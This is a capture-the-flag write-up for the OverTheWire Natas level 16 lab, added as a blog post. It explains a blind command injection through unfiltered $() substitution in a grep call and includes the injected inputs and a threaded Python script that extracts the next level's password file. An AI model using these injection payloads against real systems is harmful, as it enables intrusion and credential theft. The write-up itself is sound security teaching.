@@ -1,0 +1,134 @@
+---
+layout: post
+title:  "Natas Level 15 → Level 16"
+date:   2021-05-28 11:15:19
+categories: ctf wargames web-security
+tags: wargames ctf overthewire web-security
+series: "OverTheWire: Natas"
+excerpt: You can't see what I can see
+mathjax: false
+---
+
+## Level Goal
+Excluding the URL and username, the Level Goal section is blank for the Natas ctf.
+
+
+## Solution
+The natas16 site is an updated version of the natas9 site. This time the key is placed in quotes, and with the filters in place, we cannot reuse our solution.
+
+Here's the code for the site:
+```php
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+</pre>
+```
+
+While the filter makes our task more difficult, it does not make it impossible due to one oversight, the command substitution notation **$()** was not included. We can combine this with the way this application behaves to create a binary attack to leak the password. This is similiar to the method used in the previous level, except sqlmap won't be able to help; We'll need to script this.
+
+Note that if we search for something in database, every match comes back. If nothing is found, nothing is returned. We can create a similar attack to last level by finding a word that returns a single result. For this, I will use the word **sonatas**. I happened to find this word looking for natas in the dictionary. Any word will work so long is only one result is returned.
+
+If we use the word sonatas immediately followed by a carefully created command substitution, we can leak the password for the next level.  Enter the following into the form:
+
+```
+sonatas$(grep a /etc/natas_webpass/natas17)
+```
+
+Notice that we got the word sonatas back.  Now try searching for the following:
+```
+sonatas$(grep 8 /etc/natas_webpass/natas17)
+```
+
+The returned result is blank. This is because the natas17 password contains an "8". The matching line is now appended to the end of the word sonatas.  In other words, if the password was ***789xyz**, our first search was unaffected since there no "a", but in the second search the "8" was matched and sonatas became sonatas789xyz. Since the command substitution takes place, this is the word the application looked for.  Since sonatas789xyz is not in the dictionary, nothing was returned.
+
+With this, we can modify the scripts from the last level for this task. If you haven't read the writeup for the previous level and are not familiar with how the binary attack works, I'd recommend doing so. 
+
+Like the previous level, you'll need to supply the current level password to the script.
+
+Script Performance:
+```
+Filtering characters completed in 2.24 seconds
+Password search completed in 34.62 seconds
+
+Completed in 36.86 seconds
+```
+
+Here's the script:
+```python
+#!/usr/bin/env python
+import time
+import string
+import requests
+from requests.auth import HTTPBasicAuth
+import concurrent.futures
+
+start_script = time.perf_counter()
+all_chars = list(string.ascii_uppercase + string.ascii_lowercase + string.digits)
+natas16_password = "W------------------------------h"  # Password for the current level
+natas17_password = ""  # Buffer for the next level password
+filtered_chars = ""
+
+
+def get_chars(char):
+    req = requests.get('http://natas16.natas.labs.overthewire.org/index.php?needle=sonatas$(grep ' +
+                       char + ' /etc/natas_webpass/natas17)', auth=HTTPBasicAuth('natas16', natas16_password))
+
+    if 'sonatas' not in req.text:
+        return char
+    else:
+        return None
+
+
+start_filter = time.perf_counter()
+with concurrent.futures.ThreadPoolExecutor() as executor:
+    result = executor.map(get_chars, all_chars)
+
+    for r in result:
+        if r is not None:
+            print(r, end='', flush=True)
+            filtered_chars = filtered_chars + str(r)
+
+end_filter = time.perf_counter()
+print(f'\nFiltering characters completed in {round(end_filter - start_filter, 2)} seconds')
+
+
+def get_password(fc):
+    req = requests.get('http://natas16.natas.labs.overthewire.org/index.php?needle=sonatas$(grep ^' + natas17_password +
+                       str(fc) + ' /etc/natas_webpass/natas17)', auth=HTTPBasicAuth('natas16', natas16_password))
+
+    if 'sonatas' not in req.text:
+        return str(fc)
+    else:
+        return None
+
+
+start_password = time.perf_counter()
+for _ in range(0, 32):
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        result = executor.map(get_password, filtered_chars)
+
+        for r in result:
+            if r is not None:
+                natas17_password = natas17_password + str(r)
+                print(r, end='', flush=True)
+
+end_password = time.perf_counter()
+print(f'\nPassword search completed in {round(end_password - start_password, 2)} seconds')
+
+end_script = time.perf_counter()
+print(f'\nCompleted in {round(end_script - start_script, 2)} seconds')
+```
+
